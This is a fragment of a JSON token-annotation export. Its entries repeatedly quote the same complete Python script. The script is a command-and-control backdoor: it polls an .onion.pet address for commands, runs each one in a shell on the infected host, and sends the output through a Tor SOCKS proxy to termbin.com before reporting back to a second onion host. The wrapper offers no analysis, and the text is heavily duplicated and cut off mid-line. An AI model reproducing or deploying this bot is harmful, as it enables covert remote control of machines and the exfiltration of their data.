                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x7a54027d>",
                    "type": "UnknownWord",
                    "value": "popen"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xea8af474>",
                    "type": "UnknownWord",
                    "value": "cmd_url_order"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xea8af474>",
                            "type": "UnknownWord",
                            "value": "cmd_url_order"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x26667769>",
                    "type": "UnknownWord",
                    "value": "cmd_url_answer"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xe1878a4a>",
                            "type": "File",
                            "value": "requests.get"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x26667769>",
                            "type": "UnknownWord",
                            "value": "cmd_url_answer"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xf6c0e4d9>",
                    "type": "UnknownWord",
                    "value": "hostname_pattern"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x51d56efa>",
                    "type": "UnknownWord",
                    "value": "s-00"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x1474cd1f>",
                    "type": "UnknownWord",
                    "value": "cache_control"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xa66d738>",
                            "type": "File",
                            "value": "headers.update"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x1474cd1f>",
                            "type": "UnknownWord",
                            "value": "cache_control"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xef8ba88b>",
                    "type": "UnknownWord",
                    "value": "cache-control"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5d6d9b16>",
                    "type": "UnknownWord",
                    "value": "no-cache"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x94c12043>",
                    "type": "UnknownWord",
                    "value": "check_cmd_1"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x3ff1a8ee>",
                    "type": "UnknownWord",
                    "value": "def"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- 